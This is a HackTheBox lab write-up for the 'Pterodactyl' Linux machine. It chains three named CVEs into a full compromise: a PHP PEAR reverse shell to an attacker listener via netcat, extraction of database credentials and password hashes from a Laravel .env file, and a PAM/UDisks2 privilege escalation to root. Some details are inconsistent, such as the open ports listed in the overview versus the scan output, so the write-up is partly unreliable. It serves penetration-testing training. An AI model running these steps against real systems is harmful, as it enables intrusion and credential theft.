<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>

﻿---
title: "HTB - Pterodactyl"
date: 2026-05-03
tags: ["HackTheBox","Linux","Medium","CVE-2025-49132","CVE-2025-6019","PEAR","Laravel","UDisks2","RCE"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Pterodactyl.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Medium |
| OS | Linux |
| CVEs | CVE-2025-49132 · CVE-2025-6018 · CVE-2025-6019 |

---

## Summary

Pterodactyl is a Linux machine that chains three critical vulnerabilities for full system compromise. The Pterodactyl Panel (a Laravel-based game server management platform) is hosted on a discovered subdomain. **PHP PEAR** is enabled with writable config paths, vulnerable to **CVE-2025-49132** - unauthenticated RCE. Database credentials extracted from Laravel's `.env` file reveal a secondary user. Privilege escalation leverages **CVE-2025-6018** (PAM environment variable injection) chained with **CVE-2025-6019** (UDisks2 XFS filesystem privilege escalation) to achieve root.

---

## Attack Chain Overview

| # | Stage | Technique | CVE/Tool |
|---|-------|-----------|----------|
| 1 | Recon | nmap - ports 80/443 | - |
| 2 | Web Enum | ffuf vhost → `panel.pterodactyl.htb` (Laravel) | - |
| 3 | Foothold | CVE-2025-49132 PHP PEAR RCE (unauthenticated) | CVE-2025-49132 |
| 4 | Creds | Extract DB credentials from Laravel `.env` | - |
| 5 | User | SSH/su with extracted credentials → `user.txt` | - |
| 6 | Priv-Esc 1 | CVE-2025-6018 PAM environment variable injection | CVE-2025-6018 |
| 7 | Root | CVE-2025-6019 UDisks2 XFS filesystem priv-esc | CVE-2025-6019 |

---

## 01 - Recon & Enumeration

```bash
echo '<IP_MACHINE> pterodactyl.htb panel.pterodactyl.htb' | sudo tee -a /etc/hosts
nmap -sC -sV -T4 -p- <IP_MACHINE> --open -oN nmap.txt
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http    nginx / Apache (PHP backend)
```

### Subdomain Discovery

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
  -u http://pterodactyl.htb/ \
  -H 'Host: FUZZ.pterodactyl.htb' -fw

# [+] panel → panel.pterodactyl.htb [Status: 200]
```

### Fingerprint PEAR

```bash
curl http://panel.pterodactyl.htb/phpinfo.php
# KEY FINDING: PEAR enabled, writable config paths accessible
# PEAR version → vulnerable to CVE-2025-49132
```

---

## 02 - Foothold: CVE-2025-49132 (PHP PEAR RCE)

**Vulnerability:** PHP PEAR with a web-accessible and writable configuration directory allows an attacker to overwrite PEAR config files and inject arbitrary PHP code that executes when PEAR commands are triggered via the web interface.

### Step 1 - Confirm PEAR config path and start listener

```bash
# From phpinfo output, note PEAR config dir path
curl http://panel.pterodactyl.htb/phpinfo.php 2>/dev/null | grep -i pear

nc -lvnp 4444
```

### Step 2 - Exploit

```bash
python3 cve_2025_49132.py \
  -t http://panel.pterodactyl.htb \
  -l <IP_KALI> -p 4444
```

```
www-data@pterodactyl:/var/www/html$ id
uid=33(www-data) gid=33(www-data)
```

---

## 03 - Credential Extraction: Laravel .env

```bash
find /var/www -name '.env' 2>/dev/null
# /var/www/html/.env

cat /var/www/html/.env
# DB_CONNECTION=mysql
# DB_HOST=127.0.0.1
# DB_DATABASE=panel
# DB_USERNAME=pterodactyl
# DB_PASSWORD=<DB_PASSWORD>

# Check for system user credentials
mysql -u pterodactyl -p<DB_PASSWORD> panel -e 'SELECT email,password FROM users;'

# Reuse credentials for system user
su - <user>
<user>@pterodactyl:~$ cat user.txt
```

---

## 04 - Priv-Esc: CVE-2025-6018 + CVE-2025-6019 → root

### CVE-2025-6018 - PAM Environment Variable Injection

A misconfiguration in PAM session management allows a local user to inject environment variables that influence the behaviour of privileged processes spawned during authentication. This is a stepping stone to CVE-2025-6019.

### CVE-2025-6019 - UDisks2 XFS Filesystem Privilege Escalation

UDisks2 improperly handles user-supplied mount options when processing XFS filesystems, leading to privilege escalation. Combined with the PAM environment injection from CVE-2025-6018, an attacker can achieve code execution as root through the UDisks2 daemon.

### Step 1 - Exploit CVE-2025-6018 (PAM env injection)

```bash
# Identify PAM misconfiguration
cat /etc/pam.d/common-session | grep -i env

# CVE-2025-6018 PoC
python3 cve_2025_6018.py -u <user> -t <IP_MACHINE>
# [+] PAM env injection successful
```

### Step 2 - Exploit CVE-2025-6019 (UDisks2 XFS priv-esc)

```bash
# Create malicious XFS filesystem image
dd if=/dev/zero of=/tmp/xfs.img bs=1M count=50
mkfs.xfs /tmp/xfs.img

# CVE-2025-6019 - trigger UDisks2 to mount with injected options
python3 cve_2025_6019.py --image /tmp/xfs.img --payload /tmp/shell.elf
# [*] Sending crafted D-Bus message to UDisks2...
# [+] Root code execution triggered
```

```
root@pterodactyl:~# id
uid=0(root) gid=0(root) groups=0(root)
root@pterodactyl:~# cat /root/root.txt
```

---

## CVEs Referenced

| CVE ID | Component | Type | Description |
|--------|-----------|------|-------------|
| CVE-2025-49132 | PHP PEAR | RCE | Unauthenticated RCE via writable PEAR config paths |
| CVE-2025-6018 | PAM | Priv-Esc | PAM environment variable injection into privileged sessions |
| CVE-2025-6019 | UDisks2 | Priv-Esc | XFS filesystem option injection → root code execution via D-Bus |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan and service enumeration |
| ffuf | Virtual host / subdomain brute-force |
| curl | phpinfo fingerprint, manual endpoint testing |
| CVE-2025-49132 PoC | PHP PEAR RCE - unauthenticated initial access |
| mysql client | Laravel `.env` → DB credential extraction |
| CVE-2025-6018 PoC | PAM environment variable injection |
| CVE-2025-6019 PoC | UDisks2 XFS privilege escalation |
| netcat | Reverse shell listener |
